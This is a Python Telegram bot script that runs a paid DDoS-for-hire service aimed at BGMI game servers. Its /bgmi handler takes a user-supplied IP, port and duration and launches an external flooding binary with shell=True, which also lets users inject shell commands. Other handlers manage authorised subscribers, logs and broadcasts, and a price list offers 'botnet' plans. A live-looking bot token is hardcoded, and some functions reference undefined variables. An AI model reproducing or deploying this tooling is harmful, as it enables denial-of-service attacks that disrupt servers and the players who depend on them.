#script by @BGMI_DDOS_OP

import telebot
import subprocess
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7003322995:AAE0ZFGqMhu0S83BI4fE1Z07WCVEN6-vPyU')

# Admin user IDs
admin_id = ["6430247235"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["6430247235"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "🚫𝙇𝙊𝙂𝙎 𝘾𝙇𝙀𝘼𝙍𝙀𝘿 𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿🚫."
            else:
                file.truncate(0)
                response = "𝙇𝙊𝙂𝙎 𝘾𝙇𝙀𝘼𝙍𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔✅"
    except FileNotFoundError:
        response = "🚫𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿🚫"
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "𝙄𝙉𝙑𝘼𝙇𝙄𝘿 𝘿𝙐𝙍𝘼𝙏𝙄𝙊𝙉 𝙁𝙊𝙍𝙈𝘼𝙏𝙀🤦"
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} 𝘼𝘿𝘿𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 {duration} {time_unit}\n𝘼𝘾𝘾𝙀𝙎𝙎 𝙀𝙓𝙋𝙄𝙍𝙀𝙎 𝙊𝙉 {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍"
                else:
                    response = "🚫𝙁𝘼𝙄𝙇𝙀𝘿 𝙏𝙊 𝙎𝙀𝙏 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝙇 𝘿𝘼𝙏𝙀 . 𝙋𝙇𝙀𝘼𝙎𝙀 𝙏𝙍𝙔 𝘼𝙂𝘼𝙄𝙉 𝙇𝘼𝙏𝙀𝙍🚫"
            else:
                response = "𝙐𝙎𝙀𝙍 𝘼𝙇𝙍𝙀𝘼𝘿𝙔 𝙀𝙓𝙄𝙎𝙏𝙎🤦"
        else:
            response = "𝙋𝙇𝙀𝘼𝙎𝙀 𝙎𝙋𝙀𝘾𝙄𝙁𝙔 𝙐𝙎𝙀𝙍 𝙄𝘿 𝘼𝙉𝘿 𝘿𝙐𝙍𝘼𝙏𝙄𝙊𝙉🤦"
    else:
        response = "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿😡"

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 𝙔𝙊𝙐𝙍 𝙄𝙉𝙁𝙊\n\n🆔 𝙐𝙨𝙚𝙧 𝙞𝙙: <code>{user_id}</code>\n📝 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: {username}\n🔖 𝙍𝙤𝙡𝙚: {user_role}\n📅 𝙀𝙭𝙥𝙞𝙧𝙚 𝙙𝙖𝙩𝙚: {user_approval_expiry.get(user_id, 'Not Approved')}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝙐𝙎𝙀𝙍 {user_to_remove} 𝙍𝙀𝙈𝙊𝙑𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔👍."
            else:
                response = f"🚫𝙐𝙎𝙀𝙍 {user_to_remove} 𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿 𝙄𝙉 𝙇𝙄𝙎𝙏🚫."
        else:
            response = '''𝙋𝙇𝙀𝘼𝙎𝙀 𝙎𝙋𝙀𝘾𝙄𝙁𝙔 𝙐𝙎𝙀𝙍 𝙄𝘿 𝙏𝙊 𝙍𝙀𝙈𝙊𝙑𝙀𝘿🤦'''
    else:
        response = "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿😡"

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "🚫𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿🚫."
                else:
                    file.truncate(0)
                    response = "𝙇𝙊𝙂𝙎 𝘾𝙇𝙀𝘼𝙍𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔✅"
        except FileNotFoundError:
            response = "🚫𝙉𝙊 𝙇𝙊𝙂𝙎 𝙁𝙊𝙐𝙉𝘿🚫."
    else:
        response = "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿😡"
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "🚫𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿🚫."
                else:
                    file.truncate(0)
                    response = "𝙐𝙎𝙀𝙍 𝘾𝙇𝙀𝘼𝙍𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔✅"
        except FileNotFoundError:
            response = "🚫𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿🚫."
    else:
        response = "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿😡"
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "𝘼𝙡𝙡 𝙐𝙨𝙚𝙧𝙨🙋:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "🚫𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿🚫"
        except FileNotFoundError:
            response = "🚫𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿🚫"
    else:
        response = "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿😡"
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "🚫𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿🚫."
                bot.reply_to(message, response)
        else:
            response = "🚫𝙉𝙊 𝘿𝘼𝙏𝘼 𝙁𝙊𝙐𝙉𝘿🚫"
            bot.reply_to(message, response)
    else:
        response = "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿😡"
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 🚀\n\n𝙏𝙖𝙧𝙜𝙚𝙩: {target}\n𝙏𝙞𝙢𝙚: {time} 𝙎𝙚𝙘𝙤𝙣𝙙𝙨\n𝘼𝙩𝙩𝙖𝙘𝙠𝙚𝙧 𝙣𝙖𝙢𝙚: @{username}"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =10

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "🚫𝙔𝙊𝙐 𝘼𝙍𝙀 𝘾𝙊𝙊𝙇𝘿𝙊𝙒𝙉 𝙒𝘼𝙄𝙏 𝟏𝟎 𝙎𝙀𝘾𝙊𝙉𝘿 𝙏𝙊 𝙐𝙎𝙀 𝘼𝙂𝘼𝙄𝙉🚫"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 310:
                response = "🚫 𝙀𝙍𝙍𝙊𝙍:𝙐𝙎𝙀 𝙇𝙀𝙎𝙎𝙏𝙃𝙀𝙉 𝟑𝟎𝟎 𝙎𝙀𝘾𝙊𝙉𝘿 🚫"
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 500"
                process = subprocess.run(full_command, shell=True)
                response = f"𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔🔥"
        else:
            response = "✅ 𝙋𝙇𝙀𝘼𝙎𝙀 𝙋𝙍𝙊𝙑𝙄𝘿𝙀 <𝙄𝙋> <𝙋𝙊𝙍𝙏> <𝙏𝙄𝙈𝙀>"  # Updated command syntax
    else:
        response = ("🚫𝙔𝙊𝙐 𝘼𝙍𝙀 𝙉𝙊𝙏 𝘼𝙐𝙏𝙃𝙊𝙍𝙄𝙎𝙀𝘿 𝙏𝙊 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿🚫.🚫𝙋𝙇𝙀𝘼𝙎𝙀 𝘾𝙊𝙉𝙏𝘼𝘾𝙏 𝙏𝙊 @BGMI_DDOS_OP 𝙂𝙀𝙏 𝘼𝘾𝘾𝙀𝙎𝙎 𝙔𝙊𝙐𝙍 𝘾𝙊𝙈𝙈𝘼𝙉𝘿🚫.")

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "🚫𝙉𝙊 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙇𝙊𝙂𝙎 𝙁𝙊𝙐𝙉𝘿🚫."
        except FileNotFoundError:
            response = "🚫𝙉𝙊 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙇𝙊𝙂𝙎 𝙁𝙊𝙐𝙉𝘿🚫"
    else:
        response = "🚫𝙔𝙊𝙐 𝘼𝙍𝙀 𝙉𝙊𝙏 𝘼𝙐𝙏𝙃𝙊𝙍𝙄𝙎𝙀𝘿 𝙏𝙊 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿🚫.🚫𝙋𝙇𝙀𝘼𝙎𝙀 𝘾𝙊𝙉𝙏𝘼𝘾𝙏 𝙏𝙊 @BGMI_DDOS_OP 𝙂𝙀𝙏 𝘼𝘾𝘾𝙀𝙎𝙎 𝙔𝙊𝙐𝙍 𝘾𝙊𝙈𝙈𝘼𝙉𝘿🚫."


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''🤖 𝘼𝙑𝘼𝙄𝙇𝘼𝘽𝙇𝙀 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎:
 /bgmi : 𝙈𝙀𝙏𝙃𝙊𝘿 𝙁𝙊𝙍 𝘽𝙂𝙈𝙄 𝙎𝙀𝙍𝙑𝙀𝙍𝙎. 
 /rules : 𝙋𝙇𝙀𝘼𝙎𝙀 𝘾𝙃𝙀𝘾𝙆 𝘽𝙀𝙁𝙊𝙍𝙀 𝙐𝙎𝙀 !!.
 /plan : 𝘾𝙃𝙀𝘾𝙆𝙊𝙐𝙏 𝙊𝙐𝙍 𝘽𝙊𝙏𝙉𝙀𝙏 𝙍𝘼𝙏𝙀𝙎.
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)



@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
By @BGMI_DDOS_OP'''
    bot.reply_to(message, response)





@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''🤖 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 @BGMI_DDOS_OP 𝘿𝘿𝙊𝙎 𝘽𝙊𝙏 🤖 /help '''
    bot.reply_to(message, response)


@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 👉🏻𝙃𝙀𝙍𝙀 𝙄𝙎 𝙏𝙃𝙀 𝘿𝘿𝙊𝙎 𝙑𝙄𝙋 𝙋𝙇𝘼𝙉𝙎💸💸💸:
             
 💰 𝗩𝗜𝗣 𝗠𝗘𝗠𝗕𝗘𝗥𝗦𝗛𝗜𝗣𝗦 💰

  💰 𝗣𝗥𝗜𝗖𝗘 💰
    
  ➡️ PREMIUM
  [1DAY  - 99]
  [3DAY -199]
  
  [WEEK  - 299]
  [MONTH - 499]

  ➡️ PLATINUM
  [SEASON 999]
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)





@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "𝙈𝙀𝙎𝙎𝘼𝙂𝙀 𝙁𝙍𝙊𝙈 𝘼𝘿𝙈𝙄𝙉🙋\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙨𝙚𝙣𝙙 {user_id}: {str(e)}")
            response = "𝙈𝙀𝙎𝙎𝘼𝙂𝙀 𝙎𝙀𝙉𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔👍."
        else:
            response = "𝙋𝙍𝙊𝙑𝙄𝘿𝙀 𝙔𝙊𝙐𝙍 𝙈𝙀𝙎𝙎𝘼𝙂𝙀 𝙏𝙊 𝙎𝙀𝙉𝘿👉🏻."
    else:
        response = "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿😡"

    bot.reply_to(message, response)








#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)